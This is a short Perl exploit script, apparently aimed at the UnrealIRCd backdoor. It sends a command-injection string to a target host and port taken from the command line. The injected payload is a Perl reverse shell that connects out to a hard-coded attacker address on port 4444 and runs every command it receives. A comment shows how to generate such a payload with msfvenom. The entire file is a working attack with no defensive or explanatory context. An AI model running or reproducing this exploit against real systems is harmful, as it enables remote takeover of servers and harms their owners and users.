#!/usr/bin/perl

use Socket;
use IO::Socket;

# Generating Rshell payload with msfvenom
# msfvenom -p cmd/unix/reverse_perl LHOST=<Attackers_IP> LPORT=<Attackers_Listening_Port> -f raw
my $payload = 'AB; perl -MIO -e \'$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.168.56.1:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};\'';
$host = "";
$port = "";

$host = @ARGV[0];
$port = @ARGV[1];

if ($host eq "") { usage(); }
if ($port eq "") { usage(); }

sub usage {
    printf "\n Usage: unrealIRCD.pl [TARGET_IP] [TARGET_PORT]\n\n";
    exit(1);
}

sub exploit {
    my $sockd = IO::Socket::INET->new (PeerAddr => $host, PeerPort => $port, Proto => "tcp") || die "[!] Failed to connect to $host on $port\n\n";
    print "[*] Payload sent ...\n";
    print $sockd "$payload";
    close($sockd);
    exit(1);
}

exploit();
